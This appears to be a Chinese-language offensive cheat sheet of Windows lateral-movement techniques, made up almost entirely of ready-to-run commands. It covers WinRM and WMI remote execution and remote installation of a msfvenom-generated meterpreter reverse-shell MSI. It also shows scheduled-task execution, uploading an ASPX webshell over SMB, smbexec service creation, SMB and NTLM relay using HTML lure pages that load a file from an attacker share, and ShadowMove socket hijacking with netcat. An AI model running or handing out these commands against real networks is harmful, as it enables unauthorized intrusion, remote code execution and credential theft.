### WinRM

```bash
Enable-PSRemoting -Force

Set-Item wsman:\localhost\client\trustedhosts *
or
wmic /node:IP地址 process call create "powershell enable-psremoting -force"

Test-WSMan IP地址
```

```bash
Invoke-Command -computername 主机名 -ScriptBlock {ipconfig} -Credential (Get-Credential)
Enter-PSSession -computername 主机名 -Credential (Get-Credential)
```

### WMI

```bash
wmic /node:IP地址 /user:用户名 process call create "cmd.exe /c calc"
```

1. WMI结合MSI

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f msi > msf.msi
```

```bash
net use \\WIN-DBR3H49FQJ3\Public; copy C:\Users\Public\msf.msi \\192.168.0.173\Public\setup.msi; wmic /node:192.168.0.173 /user:snowwolf product call install PackageLocation=C:\Users\Public\setup.msi
```

```bash
net use \\WIN-DBR3H49FQJ3\Public; copy C:\Users\Public\msf.msi \\192.168.0.173\Public\setup.msi
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","C:\Users\Public\setup.msi") -ComputerName DESKTOP-PC -Credential (Get-Credential)
```

```bash
$username = 'snowwolf';$password = '123qwe!@#';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,""," C:\Users\Public\setup.msi") -ComputerName 主机名 -Credential $credential
```

2. WMI结合New-ScheduledTaskAction

```bash
$connection = New-Cimsession -ComputerName 主机名 -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("登录用户", (ConvertTo-SecureString -String '密码' -asplaintext -force)))) -ErrorAction Stop; register-scheduledTask -action (New-ScheduledTaskAction -execute "calc.exe" -cimSession $connection -WorkingDirectory "c:\windows\system32") -cimSession $connection -taskname "snowwolf"; start-scheduledtask -CimSession $connection -TaskName "snowwolf"
```

### Web目录共享

```bash
smbclient -L \\IP地址 -U administrator
smbclient //192.168.0.109/wwwroot -U administrator
put /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
```

### SmbExec

```bash
smbexec.py 域/用户@IP地址
sc create notevilserver binPath= "cmd.exe /c calc"
sc start notevilserver
```

### SMB中继

```bash
nmap -p 445 IP地址 -sS --script smb-security-mode.nse
```

smb.html:

```html
<html>
    <h1>There is not have malicious app.</h1>
    <img src="file://IP地址/payload/nothave.jpg">  //修改为攻击者主机IP地址
</html>
```

```bash
impacket-smbrelayx -h 目标主机IP地址 -c "ipconfig"
echo -e "hex"
```

### NetNLTMv2中继

```bash
impacket-ntlmrelayx -t 目标主机IP地址 -c "cmd.exe /c whoami"
```

nltm.html:

```html
<html>
    <h1>There is not have malicious app.</h1>
    <img src="file://IP地址/payload/nothave.jpg">  //修改为攻击者主机IP地址
</html>
```

### ShadowMove

[shadowmove.cpp](横向移动/shadowmove.cpp)

```bash
nc -lvp 5000
```

```bash
.\nc.exe 192.168.0.189 5000
.\shadowmove.exe PID 192.168.0.189  //PID为nc PID
```
